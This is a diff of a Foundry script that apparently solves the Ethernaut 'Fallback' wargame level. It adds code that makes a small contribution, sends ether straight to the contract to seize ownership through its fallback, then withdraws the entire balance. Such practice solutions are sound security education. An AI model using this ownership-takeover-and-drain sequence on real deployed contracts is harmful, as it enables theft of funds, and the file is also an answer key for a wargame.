@@ -15,9 +15,12 @@ contract FallbackSolution is Script, EthernautHelper {
         vm.startBroadcast(heroPrivateKey);
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
-
-        // YOUR SOLUTION HERE
         
+        Fallback fallbackinstance = Fallback(payable(challengeInstance));
+        fallbackinstance.contribute{value: 0.0001 ether}();
+        (bool success, ) = payable(challengeInstance).call{value: 0.0002 ether}("");
+        require(success, "Fallback failed");
+        fallbackinstance.withdraw();
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
